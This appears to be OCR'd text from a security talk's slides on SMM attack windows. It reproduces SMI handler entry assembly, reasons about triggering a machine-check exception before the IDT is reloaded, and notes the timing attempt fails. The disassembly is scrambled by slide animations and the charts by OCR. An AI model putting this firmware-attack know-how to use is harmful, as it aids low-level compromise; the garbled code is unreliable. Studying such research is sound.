BITS 64 sub  esp, 4 @LongMode: ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax cmp  cl, 0 push rdx mov  fs, eax je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax jz   EnableNxe mov  ax, [rbx+DSC_SS] bts  eax, 12 and  dx, 0xFFFB mov  ss, eax SkipEnable5LevelPaging: wrmsr EnableNxe: mov  rbx, [rsp+0x8] mov  cr4, rax mov  ecx, MSR_EFER rdmsr ... sub  esp, 8 or   ax, MSR_EFER_XD sgdt [rsp] wrmsr mov  rcx, rbx mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: mov  dl, 0x89 sub  esp, 8 call rax mov  [rax+TSS_SEGMENT+5], dl @XdDone: mov  eax, TSS_SEGMENT ... ltr  ax push LONG_MODE_CS call Base rsm mov  al, strict byte 1 Base: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base cmp  al, 0 jz   @SkipXd mov  ecx, MSR_EFER rdmsr mov  al, strict byte 1 or   ah, 1 ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr cmp  al, 1 mov  rbx, cr0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 mov  cr0, rbx retf

## Slide 137

BITS 16 ASM_PFX(gcSmiHandlerTemplate):

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 138

BITS 16 ASM_PFX(gcSmiHandlerTemplate): _SmiEntryPoint: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ]

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 139

BITS 16 ASM_PFX(gcSmiHandlerTemplate): _SmiEntryPoint: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ]

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 140

⊷With IDT left unsanitized, exceptions and interrupts are delivered on attacker’s interrupt handler ⊷Attack window for interrupts/exceptions: ⊸ After transition to SMM, before “lidt”

⊷Attack window for MCEs ⊸ Between “mov CR4” and “lidt”

the attack windows

## Slide 141

⊷MCE attack:

⊸ Create MCE from attacking thread, target victim thread ⊸ Receive MCE on victim thread in SMM attack window

- ⊸ Victim thread must be in SMM

⊸ While attacking thread is outside SMM

the attack windows

## Slide 142

- ⊷SMM design has all threads enter/exit SMM simultaneously

   - ⊸ Thread triggers SMI through some hardware event

   - ⊸ SMI signal sent to all threads on platform

   - ⊸ Each thread finishes its current instruction, then enters SMM

   - ⊸ In SMM, each thread waits for all others to enter rendezvous point

   - ⊸ Thread “quiescing" ensures all threads executing within SMM at same time

- ⊷Prevents non-SMM thread from attacking SMM thread

- ⊷Common pattern in privileged execution modes

thread quiescing

## Slide 143

⊷Challenge:

⊸ Victim thread must be in SMM ⊸ While attacking thread is outside SMM ⊸ Need one thread in SMM, and one thread outside SMM, at the same time

# the attack windows

## Slide 144

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

|RAM|
|---|
|SMRAM|
|MMIO|
|RAM|

## Slide 145

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax RAM mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp SMRAM CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 MMIO popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 RAM leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

## Slide 146

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

|RAM|
|---|
|SMRAM|
|MMIO|
|RAM|

## Slide 147

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

|RAM|
|---|
|SMRAM|
|MMIO|
|RAM|

## Slide 148

I/O Device

###### CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp

movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

|RAM|
|---|
|SMRAM|
|MMIO|
|RAM|

## Slide 149

I/O
Device

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax

mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp

movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

|RAM|
|---|
|SMRAM|
|MMIO|
|RAM|

## Slide 150

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

RAM
SMRAM
MMIO
RAM

## Slide 151

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

RAM
SMRAM
MMIO
RAM

## Slide 152

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

RAM SMRAM MMIO RAM

## Slide 153

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

RAM
SMRAM
MMIO
RAM

## Slide 154

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax RAM mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax SMI mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp SMRAM CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 MMIO popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 RAM leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

## Slide 155

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax SMI mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp CPU movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

RAM
SMRAM
MMIO
RAM

## Slide 156

testl %eax, %eax mov si,0x8148 je  0x100002421 movq  %r13, -64(%rbp) o32 lgdt [cs:si] movq  %r14, -56(%rbp) mov eax,0x3 movq  %r12, -48(%rbp) mov cr0,eax movl  56(%r12), %r13d jmp short 0x7a14 testl %r13d, %r13d mov ax,0x18 jle 0x1000023c9 mov ss,ax movq  -48(%rbp), %rax mov eax,0x9ffe2ff8 RAM mov esp,eax mov    %rsp,%rbp … mov eax,0x3 mov    %edi,-0x4(%rbp) mov cr0,eax mov    %esi,%eax SMI mov    %ax,-0x8(%rbp) jmp short 0x7c14 mov    -0x4(%rbp),%eax mov ax,0x18 movzwl -0x8(%rbp),%edx mov ss,ax out    %eax,(%dx) mov eax,0x9ffe4ff8 nop mov esp,eax pop    %rbp … mov si,0x8148 SMRAM CPU movq  %rcx, %rax o32 lgdt [cs:si] mov eax,0x3 addq  $8, %rsp mov cr0,eax popq  %rbx popq  %r12 jmp short 0x7e14 popq  %r13 mov ax,0x18 MMIO popq  %r14 mov ss,ax popq  %r15 mov eax,0x9ffe6ff8 popq  %rbp mov esp,eax retq … mov si,0x8148 o32 lgdt [cs:si] addq  $16, %rax mov eax,0x3 cmpq  $1880, %rax mov cr0,eax jne 0x100032976 RAM jmp short 0x8014 leaq  2000785(%rip), %rax jmp 0x100032998 mov ax,0x18 movq  -8(%rax,%rsi), %rax mov ss,ax movq  %rax, -64(%rbp) mov eax,0x9ffe8ff8 leaq  2344893(%rip), %rax mov esp,eax movq  (%rax,%r12,8), %r15

## Slide 157

SMI

CPU

testl %eax, %eax je  0x100002421 movq  %r13, -64(%rbp) movq  %r14, -56(%rbp) movq  %r12, -48(%rbp) movl  56(%r12), %r13d testl %r13d, %r13d jle 0x1000023c9 movq  -48(%rbp), %rax RAM mov    %rsp,%rbp mov    %edi,-0x4(%rbp) mov    %esi,%eax mov    %ax,-0x8(%rbp) mov    -0x4(%rbp),%eax movzwl -0x8(%rbp),%edx out    %eax,(%dx) nop pop    %rbp SMRAM movq  %rcx, %rax addq  $8, %rsp popq  %rbx popq  %r12 MMIO popq  %r13 popq  %r14 popq  %r15 popq  %rbp retq addq  $16, %rax cmpq  $1880, %rax jne 0x100032976 RAM leaq  2000785(%rip), %rax jmp 0x100032998 movq  -8(%rax,%rsi), %rax movq  %rax, -64(%rbp) leaq  2344893(%rip), %rax movq  (%rax,%r12,8), %r15

## Slide 158

### ⊷Challenge:

⊸ Victim thread must be in SMM

⊸ While attacking thread is outside SMM ⊸ Need one thread in SMM, and one thread outside SMM, at the same time

⊷Observation:

- ⊸ Threads do not technically enter SMM at the same time

- ⊸ Each thread gets to finish its current instruction

- ⊸ Attacking thread has one instruction with which to complete the attack

thread quiescing

## Slide 159

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction . out b2 (trigger SMI) receive SMI receive SMI . out b2 ends . enter SMM (idt unchanged, cr4.mce cleared) . begin executing SMI handler ⊷What if… . … . set cr4.mce . … ??? triggers MCE … . receive MCE ??? instruction ends … enter SMM … begin executing SMI handler reload IDT

## Slide 160

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction out b2 (trigger SMI) receive SMI out b2 ends 10,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … … 100 cycles receive MCE Attack window … … reload IDT

## Slide 161

- ⊷Does a ??? instruction exist?

   - ⊸ Must generate MCE after 10,000+ cycles

   - ⊸ Must be precise enough for 100 cycle attack window

## Slide 162

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse…

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
| et’s build ahammer...
| et's add a handle...
| et’s be a bit more careful...
| et’s find a nail...
| et’s light a fuse...
```

## Slide 163

⊷Some instruction cycle timings (target: 10,000)

⊸ incq %rax … 1 cycle ⊸ divq %rdx … 14 ⊸ fsin … 50

⊸ fyl2xp1 … 135

⊷No where near what is needed.

building a fuse

## Slide 164

- ⊷Bigger challenge

   - ⊸ Need instruction that generates master abort

   - ⊸ Master abort done through MMIO on PCI space

   - ⊸ Architecture requires “movl %(mem), %eax” instruction for MMIO

   - ⊸ ~6 cycles (hitting cache)

   - ⊸ ~250 cycles (hitting RAM)

   - ⊸ ~700 cycles (hitting PCI MMIO)

building a fuse

## Slide 165

- ⊷MMIO reads are an order of magnitude away from the latency needed for the fuse instruction.

- ⊷The attack won’t work.

building a fuse

## Slide 166

(demo)

building a fuse

## Slide 167

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
20000000 -
- 2600
2000000 -
j- 2400
24000000 -
|- 2200
6000000 -
i- 2000
8000000 -
- 1800
0000000 -
- 1600
000000 -
2e000000 - ihe
£0000000 - 1 1
@ 40 8 cO 100 140 180 1c 200
- 2400
- 2200
}- 2000
- 1800
- 1600
- 1400
}- 2400
- 2200
- 2000
- 1800
- 1600
- 1400
- 2400
}- 2200
- 2000
- 1800
- 1600
- 1400
- 2400
}- 2200
- 2000
- 1800
~ 1600
- 1400
- 2200
- 2000
- 1800
- 1600
- 1400
2420000 -
:
e42d8000 - - 1800
4260000 -
42e8000 - ~ 1600
€42£0000 -
428000 - pa
€4300000 ttt tts
0 4 8 c 10 14 18 tc 20
- 2000
- 1800
: - 1600
~ 1400
1 18 0 2B 0 3% 40
9480000 -
9488000 - - 2200
9490000 - 000
9498000 - _
940000 - - 1800
9408000 - 600
9460000 - ;
9468000 - - 1400
— =
94000009 ts
0 4 8 c 10 14 18 tc 20
€9680000 -
9688000 - - 2400
9690000 - - 2200
9698000 - cae
9600000 -
9608000 - ped
9660000 - =a ~ 1600
e96b8000- " . - 1400
29600007 1 1 1
0 4 8 c 10 14 18 ic 2
€940000 -
- 2000
€948000 -
€9¢50000 -
- 1800
€9c58000 -
€9c60000 -
- 1600
€968000 -
970000 -
- 1400
9278000 -
9800009 1 1 pn nn
0 4 8 c 10 14 18 tc 2
9640000 - .
e9e48000- * po
e9e50000- * + 2200
9¢58000 - Loon
9260000 -
- 1800
9268000 -
9270000 - . ~ 1600
€9¢78000 - = . - 1400
€9¢80000 ttn ns
@ 4 8 c 10 14 18 tc 20
20440000 - =
20448000 - - 2500
20450000 -
+ 2250
20458000 -
€0460000 - ~ 2000
20468000 - Lon
20470000 -
20478000 - pe
204800007 tt ts
@ 4 8 c 10 14 18 tc @
eab80000 -
eab88000 - pes
eab90000 - - 1700
eab98000 -
- 1600
eabag00d -
eaba8000 - - 1500
eabb0000 - L oeey
ccbb80)) ——
0600000 tt ttn 7 80
@ 4 8 c 10 14 18 1c 20
6200000 -
6208000 - pes
eb210000 - Ley
6218000 -
b220000 - 808)
6228000 - ae
6230000 -
6238000 - == ~ 1400
eb2400007 tt
@ 4 8 c 10 14 18 1c 20
eb400000 -
eb408000 - - 2400
eb410000 - Ly
6418000 -
- 2000
eb420000 -
6428000 - po)
eb430000 - is ~ 1600
6438000 - - 1400
6440000 +
eb7c0000 -
eb7c8000 - - 2200
eb7d0000 -
eb7d8000 - po
eb7e0000 - - 1800
eb7e8000 - ——e
eb7£0000 - hence
eb7£8000 - - 1400
eb8000005 kt
@ 4 8 c 10 14 18 tc 20
ebc00000 -
ebc08000 - Lewy
ebc10000 - z
ebc18000 - - 1800
ebc20000 - 5
ebc28000 - : - 1600
ebc 30000 - 7
ebc38000 - 7 1400
2bc400007 tt ts
